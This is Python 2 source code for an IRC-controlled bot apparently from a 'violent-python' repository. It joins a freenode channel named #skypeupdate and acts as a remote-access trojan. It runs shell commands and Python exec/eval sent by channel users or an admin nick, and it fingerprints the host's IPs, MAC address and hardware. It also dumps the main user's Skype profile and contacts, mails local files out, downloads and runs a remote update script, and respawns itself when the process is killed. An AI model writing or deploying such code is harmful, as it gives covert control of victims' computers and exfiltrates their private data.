# -*- coding: utf-8 -*-
# Nick Sweeting © 2013
# MIT Liscence

import socket
import getpass
import random
import signal
import time
import os
import sys
import subprocess
from subprocess import Popen, PIPE, STDOUT
from time import strftime, sleep
from StringIO import StringIO
import skype

#TODO: make skype.findProfile select the largest main.db, instead of failing if there is more than 1
#TODO: make run fully interactive by capturing input and using p.write() or p.stdin()

version = "2.1.2"                                                 # bot version

### Remove/comment this block to disable logging stdout/err to a file
so = se = open("bot_v%s.log" % version, 'w', 0)
# re-open stdout without buffering
sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
# redirect stdout and stderr to the log file
os.dup2(so.fileno(), sys.stdout.fileno())
os.dup2(se.fileno(), sys.stderr.fileno())
### Endblock

def log(prefix, content=''):                                      # function used to log things to stdout with a timestamp
    try:
        for line in content.split('\n'):
            print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, line))
    except:
        print('[%s] %s%s' % (strftime("%Y-%m-%d %H:%M:%S"), prefix, content))

log("[*] IRC BOT v%s" % version)

############ Variables

server = 'irc.freenode.net'
port = 6667
channel = '#skypeupdate'
admin = 'thesquash'                                               # the nick to send privmsgs to, and to check recieved message validity

hostname = socket.gethostname()									  # host's hostname
main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()		# main user of the computer detected by current owner of /dev/console
local_user = getpass.getuser()									  # user the bot is running as

nick = '[%s|%s]' % (main_user, hostname)						  # bot's nickname

helpmsg = '''Version: v%s\n
Public Commands (main channel): \n
 1. !version                                                      #-- display bot version \n
 2. !quit                                                         #-- shutdown the bot \n
 3. !reload                                                       #-- reconnect to IRC \n
 4. !identify                                                     #-- provide info on host system \n
 5. !update                                                       #-- update the bot from git \n
 6. $<command>                                                    #-- run <command> in shell and capture live output \n
 7. >>><python>                                                   #-- eval/exec python live in the bot script \n
 8. email$                                                        #-- send an email with attachments listed after $ \n
 Private Commands (admin privmsg only): \n
 1. help                                                          #-- show this message \n
 2. version                                                       #-- display bot version \n
 3. quit                                                          #-- shutdown the bot \n
 4. reload                                                        #-- reconnect to IRC \n
 5. identify                                                      #-- provide verbose info on host system \n
 6. update                                                        #-- update the bot from git \n
 7. $<command>                                                    #-- run <command> in shell and capture live output \n
 8. >>><python>                                                   #-- eval/exec python live in the bot script \n
 9. email$                                                        #-- send an email with attachments listed after $ \n
 9. skype$profile                                                 #-- get skype profile of main user \n
 9. skype$contacts                                                #-- get skype contacts of main user \n''' % version

############ Flow functions

def timeout_handler(signum, frame):                               # handler for timeout exceptions
    raise Exception("timedout")

def sigterm_handler(signum, frame):                               # if user tries to kill python process, it will spawn another one
    log('[#] ----Host attempted to shutdown bot----')
    log('[#] ----Spawning subprocess----')
    privmsg("----Host attempted to shutdown bot----")
    quit_status = True
    cmd = "sleep 15; python irc_bot.py > ./log.txt &"
    log('[>]    CMD:     ',cmd)
    p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
    log('[#] ----Subprocess Spawned----')
    privmsg('----Subprocess Spawned----')
    irc.send ( 'QUIT\r\n' )
    irc.close()
    raise SystemExit												
    sys.exit()

def line_split(seq, n):                                           # if output is multiline, split based on \n and max chars per line (n)
    output = []
    if (seq.find('\n') == -1):
        output.append(seq)
    else:
        while (seq.find('\n') != -1):
            output.append(seq.split("\n", 1)[0])
            seq = seq.split("\n", 1)[1]
    splitout = []
    for line in output:
        while line:
            splitout.append(line[:n])
            line = line[n:]
    return splitout

############ IRC functions

def scan(match):                                                  # function to scan main channel messages for strings
    if data.find(channel) != -1 and not data.find(nick) != -1:    # checking to make sure its not a private message
        return data.find(match) != -1
    else:
        return False

def privscan(match):                                              # function to scan private messages to the bot for strings
    if data.find('PRIVMSG %s :%s' % (nick, match)) != -1:
        header = data.split("PRIVMSG")[0]
        return header.find(':%s!' % admin) != -1                  # checks to make sure private message is from admin

def privmsg(msg=None, to=admin):                                  # function to send a private message to a user, defaults to master of bots!
    if type(msg) is unicode:
        import unicodedata
        msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
    elif type(msg) is not str or unicode:
        msg = str(msg)
    log('[+] Sent Data:')
    if (len(msg) > 480) or (msg.find('\n') != -1):
        log('[#] Starting multiline output.')
        msgs = line_split(msg, 480)                               # use line_split to split output into multiple lines based on max message length (480)
        total = len(msgs)
        for num, line in enumerate(msgs):
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(1)                                       # doubles as flood prevention and input checking
            try:
                data = irc.recv ( 4096 )
                log('[+] Recieved:')
                log('[>]    ', data)
                if (data.find('!stop') != -1):
                    retcode = "Stopped Output."
                    privmsg("[X]: %s" % retcode, to)
                    signal.alarm(0)
                    break
            except:
                log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
                irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))      # [1/10] Output line 1 out of 10 total
            signal.alarm(0)

        log('[#] Finished multiline output.')  
    else:
        log('[<]    PRIVMSG %s :%s\r' % (to, msg))
        irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))

def broadcast(msg):                                               # function to send a message to the main channel
    privmsg(msg, channel)

############ Keyword functions

def run_shell(cmd, timeout=60, verbose=False):                    # verbose enables live command output via yield
   out = ''
   signal.signal(signal.SIGALRM, timeout_handler)
   signal.alarm(timeout)
   try:
      p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
      log("[$]   Started.")
      continue_running = 1
   except Exception as e:
      yield("Failed: %s" % e)
      out += "Failed: %s" % e
      continue_running = 0
   signal.alarm(0)
   while(continue_running):
      signal.signal(signal.SIGALRM, timeout_handler)
      signal.alarm(4)
      try:
         signal.signal(signal.SIGALRM, timeout_handler)
         signal.alarm(2)
         try:
            line = p.stdout.readline()
            if verbose: yield(line)
            else: yield(line.strip())
            out += line
         except:
            log('[#] Checking for input.')
         data = irc.recv ( 4096 )
         log('[+] Recieved:')
         log('[>]    ', data)
         if (data.find('!cancel') != -1):
            continue_running = 0
            retcode = "Cancelled."
            yield("[X]: %s" % retcode)
            os.killpg(p.pid, signal.SIGTERM)
            break
         else:
            retcode = p.poll() #returns None while subprocess is running
      except Exception as e:
         retcode = p.poll() #returns None while subprocess is running
         log('[#] Done Checking.')
      signal.alarm(0)
      if (retcode is not None):
         line = p.stdout.read()
         if verbose: yield(line)
         out += line
         out += "[$] Exit Status: %s" % retcode
         if (retcode != 0):
            yield("[X]: %s" % retcode)
         elif (retcode == 0) and verbose:
            yield("[√]")
         continue_running = 0
         break

def run_python(cmd):                                              # interactively interprets recieved python code
    try:
        try:
            buffer = StringIO()
            sys.stdout = buffer
            exec(cmd)
            sys.stdout = sys.__stdout__
            out = buffer.getvalue()
        except Exception as error:
            out = error
        out = str(out).strip()
        if len(out) < 1:
            try:
                out = "[eval]: "+str(eval(cmd))
            except Exception as error:
                out = "[eval]: "+str(error)
        else:
            out = "[exec]: "+out
    except Exception as python_exception:
        out = "[X]: %s" % python_exception
    return out.strip()

def run(cmd, public=False):                                       # wrapper for run_shell which improves logging and responses
    def respond(content):
        if public:
            broadcast(content)
        else:
            privmsg(content)
    out = ''
    cmd = cmd.strip()
    log("[+] Ran Command:")
    log("[$]   CMD: ", [cmd])
    for line in run_shell(cmd, verbose=True):
        respond(line)
    log('[#] Done.')
    split = line_split(out, 480)
    ttl = len(split)
    for idx, line in enumerate(split):
        log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
        log("\n")

def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Info",attch=[]): # do not use attch.append() http://stackoverflow.com/a/113198/2156113
   err = """\n
      sudo mkdir -p /Library/Server/Mail/Data/spool\n
      sudo /usr/sbin/postfix set-permissions\n
      sudo /usr/sbin/postfix start
      """
   if len(attch) > 0:
      for attachment in attch:
         try:
            cmd = 'uuencode %s %s | mailx -s "%s" %s' % (attachment.strip(), attachment.strip(), subj, to)
            log('[+] Sending email...')
            log('[<]    ',cmd)
            sts = run(cmd, public=False)
            return "Sending email to %s. (subject: %s, attachments: %s\n[X]: %s)" % (to, subj, str(attch), str(sts))
         except Exception as error:
            return str(error)
   else:
      p = os.popen("/usr/sbin/sendmail -t", "w")
      p.write("To: %s" % to)
      p.write("Subject: %s" % subj)
      p.write("\n") # blank line separating headers from body
      p.write('%s\n' % msg)
      sts = p.close()
   if sts != None:
      return "Error: %s. Please fix Postfix with: %s" % (sts, err)
   else:
      return "Sent email to %s. (subject: %s, attachments: %s)" % (to, subj, str(attch))

def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates the bot by downloading source from github, then running update.sh
   log('[*] Starting Selfupdate...')
   privmsg('[*] Starting Selfupdate...')
   log('[>]   Downloading source code from git')
   cmd = "rm -Rf code.zip code; curl https://codeload.github.com/%s/%s/zip/master > code.zip" % (git_user, git_repo)
   for line in run_shell(cmd):
      log('[>]    ',line)
      privmsg('[>]    %s' % line)
   cmd = "unzip code.zip -d code"
   for line in run_shell(cmd):
      log('[>]    ',line)
      privmsg('[>]    %s' % line)
   pid = os.getpid()
   cmd = "sh code/*/update.sh %s" % pid
   for line in run_shell(cmd):
      log('[>]    ',line)
      privmsg('[>]    %s' % line)
      if line.find("Starting") != -1:
         privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
         quit_status = True
         irc.send ( 'QUIT\r\n' )
         raise SystemExit(0)

def identify():                                                   # give some identifying info about the host computer
    log('[+] Running Identification Scripts...')
    import platform
    system = platform.mac_ver()[0]
    if len(str(system)) < 1:
        system = platform.platform()
    log('[>]    OS X:    ',system)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
    local_ip = s.getsockname()[0]
    s.close()
    log('[>]    Local:   ',local_ip)
    import urllib2
    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    import uuid
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ',mac_addr)
    return "[v%s/x%s] %s@%s u: %s l: %s p: %s MAC: %s" % (version, system.strip(), local_user, hostname, main_user, local_ip, public_ip, mac_addr)
 
def full_identify():                                              # give verbose identifying info about the host computer
    log('[+] Running Identification Scripts...')
    privmsg('[+] Running Identification Scripts...')
    import platform
    system = platform.mac_ver()[0]
    log('[>]    OS X:    ',system)
    privmsg('[>]      OS X:    %s' % system)

    log('[>]    Bot:    ',local_user)
    privmsg('[>]      Bot:    %s' % local_user)

    log('[>]    User:    ',main_user)
    privmsg('[>]      User:    %s' % main_user)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8",80))
    local_ip = s.getsockname()[0]
    s.close()
    log('[>]    Local:   ',local_ip)
    privmsg('[>]      Local:   %s' % local_ip)

    import urllib2
    public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    log('[>]    Public:  ',public_ip)
    privmsg('[>]      Public:  %s' % public_ip)
    
    import uuid
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ',mac_addr)
    privmsg('[>]      MAC:     %s' % mac_addr)
    
    cmd = "system_profiler SPPowerDataType | grep Connected"
    for line in run_shell(cmd):
        log('[>]    Power:    ',line)
        privmsg('[>]      Power:    %s' % line)
    
    cmd = "uptime"
    for line in run_shell(cmd):
        log('[>]    UP:    ',line)
        privmsg('[>]      Up:    %s' % line)

    try:
        db_path = skype.findProfile(local_user)
        log('[>]    Skype:    ')
        privmsg('[>]      Skype:')
        for line in skype.printProfile(db_path):
            log('[>]              ',line)
            privmsg('[>]         %s' % line)
            sleep(1)
    except:
        log('[>]    Skype:    None Found.')
        privmsg('[>]      Skype:    None Found.')
    
    cmd = "system_profiler SPHardwareDataType"
    log('[>]    CMD:     ',cmd)
    p = subprocess.Popen([cmd],shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable='/bin/bash')
    hardware = p.stdout.read()
    log('[>]    Hardware.')
    privmsg(str(hardware))
    
    privmsg('[√] Done.')

############ The beef of things
if __name__ == '__main__':
    if len(nick) > 15: nick = '[%s]' % (local_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
    last_ping = time.time()                                       # last ping recieved
    threshold = 8 * 60                                            # maximum time between pings before assuming disconnected
    quit_status = False

    while not quit_status:
        signal.signal(signal.SIGTERM, sigterm_handler)
        try:
            timeout_count = 0
            last_data = data = ''
            log("[+] Connecting...")
            log("[<]    Nick:        ", nick)
            log("[<]    Server:      ", server+':'+str(port))
            log("[<]    Room:        ", channel)
            try:
                irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                irc.settimeout(60)                                   # timeout for irc.recv
                irc.connect((server, port))
                recv = irc.recv ( 4096 )
                log("[+] Recieved:    ", recv+'\n')
                irc.send ('NICK %s\r\n' % nick )
                irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
                irc.send ('JOIN %s\r\n' % channel)
                privmsg('Bot v%s Running.' % version)
                try:
                    privmsg('Bot reloaded due to internal exception: %s' % e)
                    del e
                except NameError:
                    pass
            except Exception as error:
                log('[*] Connection Failed: ')
                log('[X]    ',error)
                timeout_count = 50
                sleep(10)

            while not quit_status and (timeout_count < 50):          # if timeout_count is above 50, reconnect
                if (last_data == data):                              # IRC serves  will occasionally send lots of blank messages instead of disconnecting
                    timeout_count += 1
                last_data = data
                try:
                    data = irc.recv ( 4096 )
                    log('[+] Recieved:')
                    log('[>]    ', data)
                except socket.timeout:
                    if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
                        log('[*] Disconnected.')
                        timedout_count = 50
                        break
                    else:
                        data = str(time.time())
                        timedout_count = 0
                        pass

                ##Operation keyword matches
                if data.find ('PING') != -1:
                    irc.send ('PONG ' + data.split()[1] + '\r')
                    last_ping = time.time()
                    log('[+] Sent Data:')
                    log('[<]    PONG ',data.split()[1])
                    timeout_count = 0    

                elif data.find('ickname is already in use') != -1:
                    nick += str(random.randint(1,200))
                    if len(nick) > 15: nick = '[%s]%s' % (local_user[:11], random.randint(1,99))
                    timeout_count = 50
                    quit_status = False
                    break

                ##Control keyword matches
                elif scan('!quit') or privscan('quit'):
                    privmsg('Quitting.')
                    irc.send ( 'QUIT\r\n' )
                    quit_status = True

                elif scan('!reload') or privscan('reload'):
                    privmsg('Reloading.')
                    irc.send ( 'QUIT\r\n' )
                    quit_status = False
                    break

                ##Simple keywords with no arguments
                elif scan('!update') or privscan('update'):        selfupdate()
                elif scan('!version'):                             broadcast(version)
                elif scan('!identify'):                            broadcast(identify())
                elif privscan('help'):                             privmsg(helpmsg)
                elif privscan('version'):                          privmsg(version)
                elif privscan('identify'):                         full_identify()

                ##Complex keywords with arguments
                elif scan('email$'):
                    attch = data.split("$", 1)[1].split(',')
                    to = "nikisweeting+bot@gmail.com"
                    broadcast(sendmail(to.strip(),msg="whohooo",attch=attch))

                elif privscan('skype$profile'):
                    try:
                        privmsg(skype.findProfile(local_user))
                        db_path = skype.findProfile(local_user)
                        for line in skype.printProfile(db_path):
                            privmsg(line)
                            sleep(1)
                    except Exception as error:
                        privmsg(str(error))

                elif privscan('skype$contacts'):
                    try:
                        db_path = skype.findProfile(local_user)
                        for line in skype.printProfile(db_path):
                            privmsg(line)
                            sleep(1)
                        for line in skype.printContacts(db_path):
                            signal.signal(signal.SIGALRM, timeout_handler)
                            signal.alarm(1)                              # doubles as flood prevention and input checking
                            try:
                                data = irc.recv ( 4096 )
                                log('[+] Recieved:')
                                log('[>]    ', data)
                                if (data.find('!cancel') != -1):
                                    retcode = "Cancelled."
                                    privmsg("[X]: %s" % retcode)
                                    signal.alarm(0)
                                    break
                            except:
                                privmsg(line)
                            signal.alarm(0)

                    except Exception as error:
                        privmsg(str(error))

                elif scan('$'):
                    cmd = data.split("$", 1)[1]
                    run(cmd, public=True)

                elif privscan('$'):
                    cmd = data.split("$", 1)[1]
                    run(cmd, public=False)

                elif privscan('>>>'):
                    cmd = data.split(">>>", 1)[1]
                    try:
                        privmsg(run_python(cmd))
                    except Exception as python_exception:
                        privmsg("[X]: %s" % python_exception)

                elif scan('>>>'):
                    cmd = data.split(">>>", 1)[1]
                    try:
                        broadcast(run_python(cmd))
                    except Exception as python_exception:
                        privmsg("[X]: %s" % python_exception)


        except (KeyboardInterrupt, SystemExit):
            break
        except Exception as e:
            log("[#] ----EXCEPTION---- ",e)
        log("[*] EXIT")
        